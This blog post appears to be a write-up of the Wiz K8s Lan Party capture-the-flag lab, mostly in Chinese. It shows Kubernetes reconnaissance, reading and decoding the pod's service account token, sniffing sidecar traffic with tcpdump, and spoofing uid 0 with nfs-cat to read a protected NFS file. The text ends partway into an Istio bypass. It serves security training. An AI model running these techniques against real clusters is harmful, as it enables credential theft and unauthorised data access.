<!doctype html><html lang=en><head><title>Wiz K8s Lan Party :: Terminal</title>
<meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content><meta name=keywords content><meta name=robots content="noodp"><link rel=canonical href=/posts/wiz-k8s-lan-party/><link rel=stylesheet href=/css/buttons.min.2bc533403a27dfe0e93105a92502b42ce4587e2e4a87d9f7d349e51e16e09478.css><link rel=stylesheet href=/css/code.min.00125962708925857e7b66dbc58391d55be1191a3d0ce2034de8c9cd2c481c36.css><link rel=stylesheet href=/css/fonts.min.4881f0c525f3ce2a1864fb6e96676396cebe1e6fcef1933e8e1dde7041004fb5.css><link rel=stylesheet href=/css/footer.min.2e3eb191baee58dd05a9f0104ac1fab0827bca7c64dafe0b2579f934c33a1d69.css><link rel=stylesheet href=/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css><link rel=stylesheet href=/css/header.min.b6fb4423cf82a9f9d7abc9cd010223fa3d70a6526a3f28f8e17d814c06e18f9e.css><link rel=stylesheet href=/css/main.min.fe8dc560fccb53a458b0db19ccb7b265764ac46b68596b7e099c6793054dd457.css><link rel=stylesheet href=/css/menu.min.83637a90d903026bc280d3f82f96ceb06c5fc72b7c1a8d686afb5bbf818a29f7.css><link rel=stylesheet href=/css/pagination.min.82f6400eae7c7c6dc3c866733c2ec0579e4089608fea69400ff85b3880aa0d3c.css><link rel=stylesheet href=/css/post.min.fc74ca360273c1d828da3c02b8174eba435607b369d98418ccc6f2243cd4e75d.css><link rel=stylesheet href=/css/prism.min.9023bbc24533d09e97a51a0a42a5a7bfe4c591ae167c5551fb1d2191d11977c0.css><link rel=stylesheet href=/css/syntax.min.cc789ed9377260d7949ea4c18781fc58959a89287210fe4edbff44ebfc1511b6.css><link rel=stylesheet href=/css/terminal.min.dd0bf9c7cacb24c1b0184f52f1869b274e06689557468cc7030ccf632328eb97.css><link rel=stylesheet href=/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css><link rel="shortcut icon" href=/favicon.png><link rel=apple-touch-icon href=/apple-touch-icon.png><meta name=twitter:card content="summary"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="og:title" content="Wiz K8s Lan Party"><meta property="og:description" content><meta property="og:url" content="/posts/wiz-k8s-lan-party/"><meta property="og:site_name" content="Terminal"><meta property="og:image" content="/og-image.png"><meta property="og:image:width" content="1200"><meta property="og:image:height" content="627"><meta property="article:published_time" content="2024-09-03 22:33:34 +0800 +0800"></head><body><div class=container><header class=header><div class=header__inner><div class=header__logo><a href=https://en1r0py1865.github.io/><div class=logo>en1r0py1865</div></a></div><ul class="menu menu--mobile"><li class=menu__trigger>Menu&nbsp;â–¾</li><li><ul class=menu__dropdown><li><a href=/about>About</a></li></ul></li></ul></div><nav class=navigation-menu><ul class="navigation-menu__inner menu--desktop"><li><a href=/about>About</a></li></ul></nav></header><div class=content><article class=post><h1 class=post-title><a href=/posts/wiz-k8s-lan-party/>Wiz K8s Lan Party</a></h1><div class=post-meta><time class=post-date>2024-09-03</time></div><div class=post-content><div><h2 id=challenge-1-recon>Challenge 1: RECON<a href=#challenge-1-recon class=hanchor arialabel=Anchor>#</a></h2><h3 id=é¢˜ç›®>é¢˜ç›®<a href=#é¢˜ç›® class=hanchor arialabel=Anchor>#</a></h3><p>As a warmup, utilize <a href=https://thegreycorner.com/2023/12/13/kubernetes-internal-service-discovery.html#kubernetes-dns-to-the-partial-rescue>DNS scanning</a> to uncover hidden internal services and obtain the flag. We have &ldquo;loaded your machine with <a href=https://gist.github.com/nirohfeld/c596898673ead369cb8992d97a1c764e>dnscan</a> to ease this process for further challenges.</p><h3 id=æç¤º>æç¤º<a href=#æç¤º class=hanchor arialabel=Anchor>#</a></h3><p>åœ¨ Kubernetes é›†ç¾¤ä¸­è¿›è¡Œä¾¦æŸ¥æ—¶ï¼Œå¯ä»¥ä½¿ç”¨å¤šç§æ–¹æ³•æ¥æ”¶é›†ä¿¡æ¯å’Œå‘ç°èµ„æºã€‚ä»¥ä¸‹æ˜¯ä»<a href=https://thegreycorner.com/2023/12/13/kubernetes-internal-service-discovery.html#kubernetes-dns-to-the-partial-rescue>DNS scanning</a>ä¸­æ•´ç†çš„å‡ ç§ä¸»è¦ä¾¦æŸ¥æ–¹å¼åŠå…¶è¯´æ˜å’Œä½¿ç”¨åœºæ™¯ï¼š</p><ol><li>ç¯å¢ƒå˜é‡æ£€æŸ¥</li></ol><ul><li>è¯´æ˜<ul><li>ç¯å¢ƒå˜é‡é€šå¸¸åŒ…å«é›†ç¾¤ä¸­å…¶ä»–æœåŠ¡çš„ IP åœ°å€å’Œç«¯å£ï¼Œç‰¹åˆ«æ˜¯åŒ…å«å­—ç¬¦ä¸² KUBERNETES çš„å˜é‡ï¼ŒæŒ‡å‘ Kubernetes API æœåŠ¡ã€‚</li></ul></li><li>ä½¿ç”¨åœºæ™¯<ul><li>åˆæ­¥æ”¶é›†é›†ç¾¤å†…æœåŠ¡çš„ IP åœ°å€å’Œç«¯å£ã€‚</li><li>è·å– Kubernetes API æœåŠ¡å™¨çš„åœ°å€ã€‚</li></ul></li><li>ç¤ºä¾‹</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ env | grep KUBERNETES
</span></span></code></pre></div><ol start=2><li>æ–‡ä»¶ç³»ç»Ÿæ£€æŸ¥</li></ol><ul><li>è¯´æ˜<ul><li>æ£€æŸ¥ /etc/hosts å’Œ /etc/resolv.conf æ–‡ä»¶å¯ä»¥è·å– pod çš„æœ¬åœ° IP åœ°å€ã€DNS æœåŠ¡å™¨åœ°å€å’Œ DNS æœç´¢åŸŸï¼Œä»è€Œæ¨æ–­ pod çš„å‘½åç©ºé—´ã€‚</li></ul></li><li>ä½¿ç”¨åœºæ™¯<ul><li>è·å– pod çš„æœ¬åœ° IP åœ°å€å’Œåç§°ã€‚</li><li>è·å–é›†ç¾¤ DNS æœåŠ¡å™¨åœ°å€å’Œæ¨æ–­å‘½åç©ºé—´ã€‚</li></ul></li><li>ç¤ºä¾‹</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ cat /etc/hosts
</span></span><span style=display:flex><span>$ cat /etc/resolv.conf
</span></span></code></pre></div><ol start=3><li>æœåŠ¡è´¦æˆ·ä»¤ç‰Œæ£€æŸ¥</li></ol><ul><li>è¯´æ˜<ul><li>æ£€æŸ¥ pod çš„æœåŠ¡è´¦æˆ·ä»¤ç‰Œæ–‡ä»¶ /var/run/secrets/kubernetes.io/serviceaccount/tokenï¼Œå¯ä»¥è§£ç ä»¤ç‰Œä»¥æå–å£°æ˜ä¿¡æ¯ï¼ŒåŒ…æ‹¬ API æœåŠ¡å™¨åœ°å€ã€pod åç§°å’ŒæœåŠ¡è´¦æˆ·åç§°ã€‚</li></ul></li><li>ä½¿ç”¨åœºæ™¯<ul><li>è·å– Kubernetes API æœåŠ¡å™¨çš„åœ°å€ã€‚</li><li>è·å– pod åç§°å’ŒæœåŠ¡è´¦æˆ·åç§°ã€‚</li></ul></li><li>ç¤ºä¾‹</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>cat /var/run/secrets/kubernetes.io/serviceaccount/token | cut -d <span style=color:#e6db74>&#39;.&#39;</span> -f <span style=color:#ae81ff>2</span> | base64 -d
</span></span></code></pre></div><ol start=4><li>Kubernetes API è®¿é—®</li></ol><ul><li>è¯´æ˜<ul><li>ä½¿ç”¨ Kubernetes API æ˜¯è·å–é›†ç¾¤ä¸­ pod å’ŒæœåŠ¡è¯¦ç»†ä¿¡æ¯çš„ä¸»è¦æ–¹å¼ã€‚å¯ä»¥ä½¿ç”¨<code>kubectl</code>å·¥å…·æˆ–<code>curl</code>å‘½ä»¤è¿›è¡ŒæŸ¥è¯¢ã€‚</li></ul></li><li>ä½¿ç”¨åœºæ™¯<ul><li>è·å–é›†ç¾¤ä¸­æ‰€æœ‰ pod å’ŒæœåŠ¡çš„è¯¦ç»†ä¿¡æ¯ã€‚</li><li>æ£€æŸ¥æœåŠ¡è´¦æˆ·ä»¤ç‰Œçš„æƒé™ã€‚</li></ul></li><li>ç¤ºä¾‹</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ kubectl --token <span style=color:#e6db74>&#34;</span><span style=color:#66d9ef>$(</span>cat /var/run/secrets/kubernetes.io/serviceaccount/token<span style=color:#66d9ef>)</span><span style=color:#e6db74>&#34;</span> get pods -o wide
</span></span><span style=display:flex><span>$ curl -H <span style=color:#e6db74>&#34;Authorization: Bearer </span><span style=color:#66d9ef>$(</span>cat /var/run/secrets/kubernetes.io/serviceaccount/token<span style=color:#66d9ef>)</span><span style=color:#e6db74>&#34;</span> --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt https://10.100.0.1/api/v1/namespaces/k8s-lan-party/pods
</span></span></code></pre></div><ol start=5><li>ä¼ ç»Ÿçš„ä¸»æœºå’Œç«¯å£å‘ç°</li></ol><ul><li>è¯´æ˜<ul><li>å¦‚æœæ— æ³•ä½¿ç”¨ Kubernetes APIï¼Œå¯ä»¥ä½¿ç”¨ä¼ ç»Ÿçš„ç½‘ç»œæ‰«ææŠ€æœ¯æ¥å‘ç°ä¸»æœºå’ŒæœåŠ¡ã€‚å¯ä»¥ä½¿ç”¨<code>ping</code>å‘½ä»¤æ£€æŸ¥ä¸»æœºæ˜¯å¦åœ¨çº¿ï¼Œä½¿ç”¨<code>nmap</code>è¿›è¡Œç«¯å£æ‰«æã€‚</li></ul></li><li>ä½¿ç”¨åœºæ™¯<ul><li>åœ¨æ— æ³•è®¿é—® Kubernetes API æ—¶ï¼Œå‘ç°é›†ç¾¤ä¸­çš„ä¸»æœºå’ŒæœåŠ¡ã€‚</li><li>è¯†åˆ«é›†ç¾¤ä¸­æ´»åŠ¨çš„ IP åœ°å€å’Œå¼€æ”¾ç«¯å£ã€‚</li></ul></li><li>ç¤ºä¾‹</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ ping 10.96.0.1
</span></span><span style=display:flex><span>$ nmap -oG dns_scan_svc_1 -sn -Pn -R 10.96.0.0/16
</span></span></code></pre></div><ol start=6><li>Kubernetes DNS æœåŠ¡</li></ol><ul><li>è¯´æ˜<ul><li>Kubernetes DNS æœåŠ¡è‡ªåŠ¨ä¸ºé›†ç¾¤ä¸­çš„ pod å’ŒæœåŠ¡åˆ›å»º DNS è®°å½•ï¼Œå¯ä»¥é€šè¿‡åå‘ DNS æŸ¥æ‰¾æ¥è¯†åˆ«æ´»åŠ¨çš„æœåŠ¡å’Œ podã€‚</li></ul></li><li>ä½¿ç”¨åœºæ™¯<ul><li>è¯†åˆ«é›†ç¾¤ä¸­ä¸æœåŠ¡å…³è”çš„ IP åœ°å€ã€‚</li><li>é€šè¿‡åå‘ DNS æŸ¥æ‰¾ç¼©å°æ½œåœ¨çš„ IP èŒƒå›´ã€‚</li></ul></li><li>ç¤ºä¾‹</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>dig +short -x 10.96.0.10
</span></span><span style=display:flex><span>dig +short SRV _https._tcp.kubernetes.default.svc.cluster.local
</span></span></code></pre></div><h3 id=è§£é¢˜>è§£é¢˜<a href=#è§£é¢˜ class=hanchor arialabel=Anchor>#</a></h3><ol><li>æ­¤é¢˜é€šè¿‡envå‘½ä»¤å¯ä»¥è·å¾—ç›¸å…³ä¿¡æ¯</li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ env
</span></span><span style=display:flex><span>KUBERNETES_SERVICE_PORT_HTTPS<span style=color:#f92672>=</span><span style=color:#ae81ff>443</span>
</span></span><span style=display:flex><span>KUBERNETES_SERVICE_PORT<span style=color:#f92672>=</span><span style=color:#ae81ff>443</span>
</span></span><span style=display:flex><span>USER_ID<span style=color:#f92672>=</span>061d21d7-c07c-49b7-a0cd-957a4f25d8c3
</span></span><span style=display:flex><span>HISTSIZE<span style=color:#f92672>=</span><span style=color:#ae81ff>2048</span>
</span></span><span style=display:flex><span>PWD<span style=color:#f92672>=</span>/home/player
</span></span><span style=display:flex><span>HOME<span style=color:#f92672>=</span>/home/player
</span></span><span style=display:flex><span>KUBERNETES_PORT_443_TCP<span style=color:#f92672>=</span>tcp://10.100.0.1:443
</span></span><span style=display:flex><span>HISTFILE<span style=color:#f92672>=</span>/home/player/.bash_history
</span></span><span style=display:flex><span>TMPDIR<span style=color:#f92672>=</span>/tmp
</span></span><span style=display:flex><span>TERM<span style=color:#f92672>=</span>xterm-256color
</span></span><span style=display:flex><span>SHLVL<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>KUBERNETES_PORT_443_TCP_PROTO<span style=color:#f92672>=</span>tcp
</span></span><span style=display:flex><span>KUBERNETES_PORT_443_TCP_ADDR<span style=color:#f92672>=</span>10.100.0.1
</span></span><span style=display:flex><span>KUBERNETES_SERVICE_HOST<span style=color:#f92672>=</span>10.100.0.1
</span></span><span style=display:flex><span>KUBERNETES_PORT<span style=color:#f92672>=</span>tcp://10.100.0.1:443
</span></span><span style=display:flex><span>KUBERNETES_PORT_443_TCP_PORT<span style=color:#f92672>=</span><span style=color:#ae81ff>443</span>
</span></span><span style=display:flex><span>HISTFILESIZE<span style=color:#f92672>=</span><span style=color:#ae81ff>2048</span>
</span></span><span style=display:flex><span>_<span style=color:#f92672>=</span>/usr/bin/env
</span></span></code></pre></div><ol start=2><li>é€šè¿‡é¢˜ç›®ä¸­æä¾›çš„<a href=https://gist.github.com/nirohfeld/c596898673ead369cb8992d97a1c764e>dnscan</a>æ‰«æk8s service æˆ–ä½¿ç”¨nmapå¯¹k8s api service çš„ç½‘æ®µè¿›è¡Œæ‰«æ</li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ nmap -sn -Pn -R 10.100.0.1/16 | grep svc
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> getflag-service.k8s-lan-party.svc.cluster.local <span style=color:#f92672>(</span>10.100.136.254<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$ dnscan -subnet 10.100.0.1/16
</span></span><span style=display:flex><span>10.100.136.254 -&gt; getflag-service.k8s-lan-party.svc.cluster.local.
</span></span></code></pre></div><ol start=3><li>é€šè¿‡è®¿é—®getflag-service.k8s-lan-party.svc.cluster.local å³å¯è·å¾—flag</li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ curl getflag-service.k8s-lan-party.svc.cluster.local
</span></span><span style=display:flex><span>wiz_k8s_lan_party<span style=color:#f92672>{</span>between-thousands-of-ips-you-found-your-northen-star<span style=color:#f92672>}</span>
</span></span></code></pre></div><h3 id=æ€è€ƒ>æ€è€ƒ<a href=#æ€è€ƒ class=hanchor arialabel=Anchor>#</a></h3><p>éœ€é¿å…åœ¨ä¸Šè¿°åœ°æ–¹å­˜å‚¨æ•æ„Ÿæ•°æ®ï¼Œè‹¥å¿…é¡»å­˜å‚¨ï¼Œåˆ™éœ€è¦è¿›è¡Œç›‘æ§ã€‚</p><h2 id=challenge-2-finding-neighbours>Challenge 2: FINDING NEIGHBOURS<a href=#challenge-2-finding-neighbours class=hanchor arialabel=Anchor>#</a></h2><h3 id=é¢˜ç›®-1>é¢˜ç›®<a href=#é¢˜ç›®-1 class=hanchor arialabel=Anchor>#</a></h3><p>Sometimes, it seems we are the only ones around, but we should always be on guard against invisible <a href=https://kubernetes.io/zh-cn/docs/concepts/workloads/pods/sidecar-containers/>sidecars</a> reporting sensitive secrets.</p><h3 id=è§£é¢˜-1>è§£é¢˜<a href=#è§£é¢˜-1 class=hanchor arialabel=Anchor>#</a></h3><p>æ ¹æ®<a href=https://kubernetes.io/zh-cn/docs/concepts/workloads/pods/sidecar-containers/>sidecars</a>çš„å†…å®¹ï¼Œå¯ä»¥å¾—çŸ¥Sidecarå®¹å™¨ä¸ä¸»å®¹å™¨å…±åŒä½¿ç”¨å­˜å‚¨ä¸ç½‘ç»œnamespaceã€‚
å°è¯•ä½¿ç”¨<code>tcpdump</code>è¿›è¡Œç½‘ç»œç›‘å¬</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ tcpdump -X
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>16:00:16.078369 IP 192.168.23.43.44200 &gt; reporting-service.k8s-lan-party.svc.cluster.local.http: Flags <span style=color:#f92672>[</span>P.<span style=color:#f92672>]</span>, seq 1:215, ack 1, win 502, options <span style=color:#f92672>[</span>nop,nop,TS val <span style=color:#ae81ff>1652472708</span> ecr 992109221<span style=color:#f92672>]</span>, length 214: HTTP: POST / HTTP/1.1
</span></span><span style=display:flex><span>        0x0000:  <span style=color:#ae81ff>4500</span> 010a 2f8a <span style=color:#ae81ff>4000</span> 7f06 3db1 c0a8 172b  E.../.@...<span style=color:#f92672>=</span>....+
</span></span><span style=display:flex><span>        0x0010:  0a64 ab7b aca8 <span style=color:#ae81ff>0050</span> 9d66 d16f f677 63b0  .d.<span style=color:#f92672>{</span>...P.f.o.wc.
</span></span><span style=display:flex><span>        0x0020:  <span style=color:#ae81ff>8018</span> 01f6 8eaf <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0101</span> 080a 627e bb84  ............b~..
</span></span><span style=display:flex><span>        0x0030:  3b22 62a5 504f <span style=color:#ae81ff>5354</span> 202f <span style=color:#ae81ff>2048</span> <span style=color:#ae81ff>5454</span> 502f  ;<span style=color:#e6db74>&#34;b.POST./.HTTP/
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        0x0040:  312e 310d 0a48 6f73 743a 2072 6570 6f72  1.1..Host:.repor
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        0x0050:  7469 6e67 2d73 6572 7669 6365 0d0a 5573  ting-service..Us
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        0x0060:  6572 2d41 6765 6e74 3a20 6375 726c 2f37  er-Agent:.curl/7
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        0x0070:  2e36 342e 300d 0a41 6363 6570 743a 202a  .64.0..Accept:.*
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        0x0080:  2f2a 0d0a 436f 6e74 656e 742d 4c65 6e67  /*..Content-Leng
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        0x0090:  7468 3a20 3633 0d0a 436f 6e74 656e 742d  th:.63..Content-
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        0x00a0:  5479 7065 3a20 6170 706c 6963 6174 696f  Type:.applicatio
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        0x00b0:  6e2f 782d 7777 772d 666f 726d 2d75 726c  n/x-www-form-url
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        0x00c0:  656e 636f 6465 640d 0a0d 0a77 697a 5f6b  encoded....wiz_k
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        0x00d0:  3873 5f6c 616e 5f70 6172 7479 7b67 6f6f  8s_lan_party{goo
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        0x00e0:  642d 6372 696d 652d 636f 6d65 732d 7769  d-crime-comes-wi
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        0x00f0:  7468 2d61 2d70 6172 746e 6572 2d69 6e2d  th-a-partner-in-
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        0x0100:  612d 7369 6465 6361 727d                 a-sidecar}
</span></span></span></code></pre></div><h3 id=æ€è€ƒ-1>æ€è€ƒ<a href=#æ€è€ƒ-1 class=hanchor arialabel=Anchor>#</a></h3><p>åœ¨å®¹å™¨å†…éƒ¨å°½é‡é¿å…éå¿…è¦çš„å·¥å…·ï¼Œä¾‹å¦‚tcpdumpã€‚</p><h2 id=challenge-3-data-leakage>Challenge 3: DATA LEAKAGE<a href=#challenge-3-data-leakage class=hanchor arialabel=Anchor>#</a></h2><h3 id=é¢˜ç›®-2>é¢˜ç›®<a href=#é¢˜ç›®-2 class=hanchor arialabel=Anchor>#</a></h3><p>The targeted big corp utilizes outdated, yet cloud-supported technology for data storage in production. But oh my, this technology was introduced in an era when access control was only network-based ğŸ¤¦â€ï¸.</p><h3 id=è§£é¢˜-2>è§£é¢˜<a href=#è§£é¢˜-2 class=hanchor arialabel=Anchor>#</a></h3><ol><li>æŸ¥çœ‹ä¸­å…¨éƒ¨æŒ‚è½½çš„æ–‡ä»¶ç³»ç»Ÿã€‚</li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ df -h
</span></span><span style=display:flex><span>Filesystem                                          Size  Used Avail Use% Mounted on
</span></span><span style=display:flex><span>overlay                                             300G  8.4G  292G   3% /
</span></span><span style=display:flex><span>fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com:/  8.0E     <span style=color:#ae81ff>0</span>  8.0E   0% /efs
</span></span><span style=display:flex><span>tmpfs                                                60G   12K   60G   1% /var/run/secrets/kubernetes.io/serviceaccount
</span></span><span style=display:flex><span>tmpfs                                                64M     <span style=color:#ae81ff>0</span>   64M   0% /dev/null
</span></span></code></pre></div><ol start=2><li>æŸ¥çœ‹åŒ…å«é‡è¦ä¿¡æ¯çš„æŒ‚è½½æ–‡ä»¶ç³»ç»Ÿçš„è¯¦ç»†ä¿¡æ¯ã€‚</li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ mount |grep /efs
</span></span><span style=display:flex><span>fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com:/ on /efs type nfs4 <span style=color:#f92672>(</span>ro,relatime,vers<span style=color:#f92672>=</span>4.1,rsize<span style=color:#f92672>=</span>1048576,wsize<span style=color:#f92672>=</span>1048576,namlen<span style=color:#f92672>=</span>255,hard,noresvport,proto<span style=color:#f92672>=</span>tcp,timeo<span style=color:#f92672>=</span>600,retrans<span style=color:#f92672>=</span>2,sec<span style=color:#f92672>=</span>sys,clientaddr<span style=color:#f92672>=</span>192.168.57.108,local_lock<span style=color:#f92672>=</span>none,addr<span style=color:#f92672>=</span>192.168.124.98<span style=color:#f92672>)</span>
</span></span></code></pre></div><ol start=3><li>ä¸Šè¿°ç»“æœæ˜¾ç¤ºå…¶ NFSv4 æ–‡ä»¶ç³»ç»Ÿè¢«æŒ‚è½½åœ¨ <code>/efs</code> ç›®å½•ä¸Šï¼Œå¹¶ä¸”ä»¥åªè¯»æ¨¡å¼è¿›è¡Œè®¿é—®ã€‚
é¦–å…ˆä½¿ç”¨ <code>nfs-ls</code> æŸ¥çœ‹å†…å®¹ã€‚æ ¹æ®<a href=https://github.com/sahlberg/libnfs>libnfs æ–‡æ¡£</a>ï¼Œæ­¤å·¥å…·é»˜è®¤ä½¿ç”¨ NFSv3ï¼Œå¯ä»¥ä½¿ç”¨ URL å‚æ•° <code>version=4</code> æ¥é€‰æ‹© NFSv4ã€‚</li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ nfs-ls nfs://fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com/?version<span style=color:#f92672>=</span><span style=color:#ae81ff>4</span>
</span></span><span style=display:flex><span>----------  <span style=color:#ae81ff>1</span>     <span style=color:#ae81ff>1</span>     <span style=color:#ae81ff>1</span>           <span style=color:#ae81ff>73</span> flag.txt
</span></span></code></pre></div><ol start=4><li>ç›´æ¥ä½¿ç”¨<code>nfs-cat</code>æå–æ–‡ä»¶å†…å®¹ï¼Œä¼šè·å¾—æƒé™ä¸è¶³é”™è¯¯</li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ nfs-cat nfs://fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com//flag.txt?version<span style=color:#f92672>=</span><span style=color:#ae81ff>4</span>
</span></span><span style=display:flex><span>Failed to open file /flag.txt: open call failed with <span style=color:#e6db74>&#34;NFS4: (path /) failed with NFS4ERR_ACCESS(-13)&#34;</span>
</span></span><span style=display:flex><span>Failed to open nfs://fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com//flag.txt?version<span style=color:#f92672>=</span><span style=color:#ae81ff>4</span>
</span></span></code></pre></div><ol start=5><li>æ ¹æ®<a href=https://github.com/sahlberg/libnfs>libnfs æ–‡æ¡£</a>ï¼Œå¯ä»¥é€šè¿‡å‚æ•°ä¼ªé€ uidã€‚</li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ nfs-cat <span style=color:#e6db74>&#34;nfs://fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com//flag.txt?version=4&amp;uid=0&#34;</span>
</span></span><span style=display:flex><span>wiz_k8s_lan_party<span style=color:#f92672>{</span>old-school-network-file-shares-infiltrated-the-cloud!<span style=color:#f92672>}</span>
</span></span></code></pre></div><h3 id=æ€è€ƒ-2>æ€è€ƒ<a href=#æ€è€ƒ-2 class=hanchor arialabel=Anchor>#</a></h3><p>é¿å…ä¸å®‰å…¨çš„NFSé…ç½®ã€‚</p><h2 id=challenge-4-bypassing-boundaries>Challenge 4: BYPASSING BOUNDARIES<a href=#challenge-4-bypassing-boundaries class=hanchor arialabel=Anchor>#</a></h2><h3 id=é¢˜ç›®-3>é¢˜ç›®<a href=#é¢˜ç›®-3 class=hanchor arialabel=Anchor>#</a></h3><p>Apparently, new service mesh technologies hold unique appeal for ultra-elite users (root users). Don&rsquo;t abuse this power; use it responsibly and with caution.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-yaml data-lang=yaml><span style=display:flex><span><span style=color:#f92672>apiVersion</span>: <span style=color:#ae81ff>security.istio.io/v1beta1</span>
</span></span><span style=display:flex><span><span style=color:#f92672>kind</span>: <span style=color:#ae81ff>AuthorizationPolicy</span>
</span></span><span style=display:flex><span><span style=color:#f92672>metadata</span>:
</span></span><span style=display:flex><span>  <span style=color:#f92672>name</span>: <span style=color:#ae81ff>istio-get-flag</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>namespace</span>: <span style=color:#ae81ff>k8s-lan-party</span>
</span></span><span style=display:flex><span><span style=color:#f92672>spec</span>:
</span></span><span style=display:flex><span>  <span style=color:#f92672>action</span>: <span style=color:#ae81ff>DENY</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>selector</span>:
</span></span><span style=display:flex><span>    <span style=color:#f92672>matchLabels</span>:
</span></span><span style=display:flex><span>      <span style=color:#f92672>app</span>: <span style=color:#e6db74>&#34;{flag-pod-name}&#34;</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>rules</span>:
</span></span><span style=display:flex><span>  - <span style=color:#f92672>from</span>:
</span></span><span style=display:flex><span>    - <span style=color:#f92672>source</span>:
</span></span><span style=display:flex><span>        <span style=color:#f92672>namespaces</span>: [<span style=color:#e6db74>&#34;k8s-lan-party&#34;</span>]
</span></span><span style=display:flex><span>    <span style=color:#f92672>to</span>:
</span></span><span style=display:flex><span>    - <span style=color:#f92672>operation</span>:
</span></span><span style=display:flex><span>        <span style=color:#f92672>methods</span>: [<span style=color:#e6db74>&#34;POST&#34;</span>, <span style=color:#e6db74>&#34;GET&#34;</span>]
</span></span></code></pre></div><h3 id=è§£é¢˜-3>è§£é¢˜<a href=#è§£é¢˜-3 class=hanchor arialabel=Anchor>#</a></h3><ol><li>æ‰«æ</li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># dnscan -subnet 10.100.0.1/16</span>
</span></span><span style=display:flex><span>10.100.224.159 -&gt; istio-protected-pod-service.k8s-lan-party.svc.cluster.local.
</span></span></code></pre></div><ol start=2><li>å°è¯•è®¿é—®</li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># curl istio-protected-pod-service.k8s-lan-party.svc.cluster.local</span>
